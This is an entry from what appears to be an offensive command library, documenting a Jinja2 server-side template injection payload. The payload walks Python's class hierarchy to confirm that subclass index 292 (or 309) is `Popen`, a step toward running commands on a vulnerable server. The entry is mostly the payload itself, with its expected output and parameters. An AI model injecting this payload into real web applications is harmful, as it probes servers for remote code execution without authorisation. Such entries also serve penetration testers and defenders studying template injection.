---
data: '{{ ''''.__class__.__mro__[1].__subclasses__()[292].__name__ }}'
tags:
  - verification
type: command
output: Popen
executor: python
platforms:
  - Python
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.992Z'
id: 3a6ed18e-913b-4917-a1f8-33d255dd24bf
verified: false
validated: true
submitted: true
---
# jinja2-verify-class-name

## Command

```python
{{ ''.__class__.__mro__[1].__subclasses__()[292].__name__ }}
```

## Description

Retrieves and renders the name of the class at a specific subclass index to verify it's Popen.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| index | Array index (e.g., 292) | Yes |

## Examples

### Basic Usage

```python
{{ ''.__class__.__mro__[1].__subclasses__()[292].__name__ }}
```

### Advanced Usage

Adjust index: [309]

## Expected Output

'Popen'

## Related

- [[commands/jinja2-enumerate-subclasses]]
